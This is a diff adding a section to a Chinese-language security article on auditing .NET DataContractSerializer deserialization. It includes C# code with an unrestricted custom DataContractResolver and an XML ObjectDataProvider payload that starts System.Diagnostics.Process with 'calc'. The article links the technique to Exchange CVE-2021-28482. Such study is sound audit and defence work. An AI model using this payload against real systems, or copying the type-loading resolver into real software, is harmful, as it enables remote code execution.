@@ -296,8 +296,164 @@ namespace DataContractDeserialize
 
 # 审计
 
-关注type的值是否可控。
+审计需要关注的是type的值是否可控。涉及到三个点：
+
+1. type可以通过xml解析拿到type属性
+2. 通过构造函数中的`IEnumerable<Type> knownTypes`参数控制type
+3. 通过构造函数的`DataContractResolver`参数，审计自定义类型转换器对type的处理是否可控。
+4. 构造函数的IDataContractSurrogate参数，关注其实现。**这个在DataContractJsonSerializer一节中讲解，本文不讲。**
+
+前两个不讲了，主要看后两个。当我们不可控制Type，但是Type实例中有松散的数据类型(如object类型)可控，那么如果使用了自定义的类型解析器DataContractResolver传入构造函数，并且自定义解析器中没有对type进行限制，那么仍然可以RCE。
+
+```csharp
+using System;
+using System.IO;
+using System.Reflection;
+using System.Runtime.Serialization;
+using System.Text;
+using System.Windows.Data;
+using System.Xml;
+
+namespace DataContractDeserialize
+{
+    [DataContract]
+    class MyClass
+    {
+        [DataMember]
+        public object o;
+    }
+    [DataContract]
+    class ProcessClass
+    {
+        public void Start(string cmd)
+        {
+            Console.WriteLine(cmd);
+        }
+    }
+    class Program
+    {
+        static void Main(string[] args)
+        {
+
+            MyClass myClass = new MyClass();
+            ObjectDataProvider objectDataProvider = new ObjectDataProvider();
+            objectDataProvider.MethodName = "Start";
+            objectDataProvider.MethodParameters.Add("calc");
+            objectDataProvider.ObjectInstance = new ProcessClass();
+            myClass.o = objectDataProvider;
+
+            DataContractSerializer ser = new DataContractSerializer(typeof(MyClass), null, int.MaxValue, true, false, null, new MyDataContractResolver());
+            using (MemoryStream memory = new MemoryStream())
+            {
+                ser.WriteObject(memory, myClass);
+                Console.WriteLine(Encoding.UTF8.GetString(memory.ToArray()));
+            }
+            using (MemoryStream memory1 = new MemoryStream(Encoding.UTF8.GetBytes(File.ReadAllText(@"C:\Users\ddd\source\repos\NetSerializer\DataContract\bin\Debug\a.xml"))))
+            {
+                ser.ReadObject(memory1);
+            }
+            //Console.WriteLine(Process.GetCurrentProcess().GetType().AssemblyQualifiedName);
+            Console.ReadKey();
+        }
+    }
+
+    internal class MyDataContractResolver : DataContractResolver
+    {
+        public override Type ResolveName(string typeName, string typeNamespace, Type declaredType, DataContractResolver knownTypeResolver)
+        {
+            Type type = Type.GetType(typeName, false);
+            if (type == null)
+            {
+                type = Assembly.Load(typeNamespace).GetType(typeName, false);
+            }
+            return type ?? knownTypeResolver.ResolveName(typeName, typeNamespace, declaredType, null);
+        }
+
+        public override bool TryResolveType(Type type, Type declaredType, DataContractResolver knownTypeResolver, out XmlDictionaryString typeName, out XmlDictionaryString typeNamespace)
+        {
+            typeName = new XmlDictionaryString(XmlDictionary.Empty, type.FullName, 0);
+            typeNamespace = new XmlDictionaryString(XmlDictionary.Empty, type.Assembly.FullName, 0);
+            return true;
+        }
+    }
+}
+```
+
+看自己实现的类型解析器，在要序列化的对象类型不在knownTypes列表中，会触发自定义的类型解析器，将type和命名空间传入。
+
+![image-20210512171152157](DataContractSerializer.assets/image-20210512171152157.png)
+
+而我们自己写的类型解析器直接进行加载类型并返回，所以可以拿到对应的类型。相当于绕过了knownTypes
+
+![image-20210512170851071](DataContractSerializer.assets/image-20210512170851071.png)
+
+生成的xml如下
+
+```xml
+<MyClass xmlns="http://schemas.datacontract.org/2004/07/DataContractDeserialize"
+    xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+    <o i:type="a:System.Windows.Data.ObjectDataProvider"
+        xmlns:a="PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+        <IsInitialLoadEnabled xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">true</IsInitialLoadEnabled>
+        <ConstructorParameters i:type="a:MS.Internal.Data.ParameterCollection"
+            xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+            xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
+        <IsAsynchronous xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">false</IsAsynchronous>
+        <MethodName xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">Start</MethodName>
+        <MethodParameters i:type="a:MS.Internal.Data.ParameterCollection"
+            xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+            xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+            <b:anyType i:type="c:System.String"
+                xmlns:c="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">calc</b:anyType>
+        </MethodParameters>
+        <ObjectInstance i:type="b:DataContractDeserialize.ProcessClass"
+            xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+            xmlns:b="DataContract, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"/>
+        <ObjectType i:type="c:System.RuntimeType" z:FactoryType="c:System.UnitySerializationHolder"
+            xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+            xmlns:b="http://schemas.datacontract.org/2004/07/System"
+            xmlns:c="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+            xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/">
+            <Data i:type="c:System.String"
+                xmlns="">DataContractDeserialize.ProcessClass</Data>
+            <UnityType i:type="c:System.Int32"
+                xmlns="">4</UnityType>
+            <AssemblyName i:type="c:System.String"
+                xmlns="">DataContract, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null</AssemblyName>
+        </ObjectType>
+    </o>
+</MyClass>
+```
+
+把ObjectInstance的type替换为`System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089`，然后加上`__identity`字段，不然会报错。修改一下之后payload如下：
+
+```xml
+<MyClass xmlns="http://schemas.datacontract.org/2004/07/DataContractDeserialize"
+  xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+  <o i:type="a:System.Windows.Data.ObjectDataProvider"
+    xmlns:a="PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">
+    <IsInitialLoadEnabled xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">true</IsInitialLoadEnabled>
+    <ConstructorParameters i:type="a:MS.Internal.Data.ParameterCollection"
+      xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+      xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays"/>
+    <IsAsynchronous xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">false</IsAsynchronous>
+    <MethodName xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">Start</MethodName>
+    <MethodParameters i:type="a:MS.Internal.Data.ParameterCollection"
+      xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data"
+      xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+      <b:anyType i:type="c:System.String"
+        xmlns:c="mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">calc</b:anyType>
+    </MethodParameters>
+    <ObjectInstance i:type="System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
+      xmlns="http://schemas.datacontract.org/2004/07/System.Windows.Data">
+      <__identity i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System"/>
+    </ObjectInstance>
+  </o>
+</MyClass>
+```
+
+然后反序列化就会触发Process的Start了。
 
 # 后文
 
-本文讲解了DataContractSerializer反序列化以及SessionViewStateHistoryItem攻击链。
+本文讲解了DataContractSerializer反序列化以及SessionViewStateHistoryItem攻击链，并且讲解了控制type的几种方法，其中对于DataContractResolver在Exchange CVE-2021-28482反序列化漏洞有实际应用。
